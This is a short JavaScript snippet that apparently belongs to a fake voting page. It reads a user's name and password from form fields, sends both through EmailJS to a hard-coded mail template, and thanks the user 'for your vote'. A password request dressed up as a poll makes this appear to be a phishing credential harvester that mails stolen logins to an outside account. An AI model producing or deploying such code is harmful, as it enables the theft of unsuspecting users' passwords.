function sendMail(){
  let parms ={
    from_name: document.getElementById("name").value,
    Pass_user: document.getElementById("pass").value,
  }

  emailjs.send("service_c5buabe","template_rjpj60s",parms).then(alert("Thanks For Your Vote"))
}

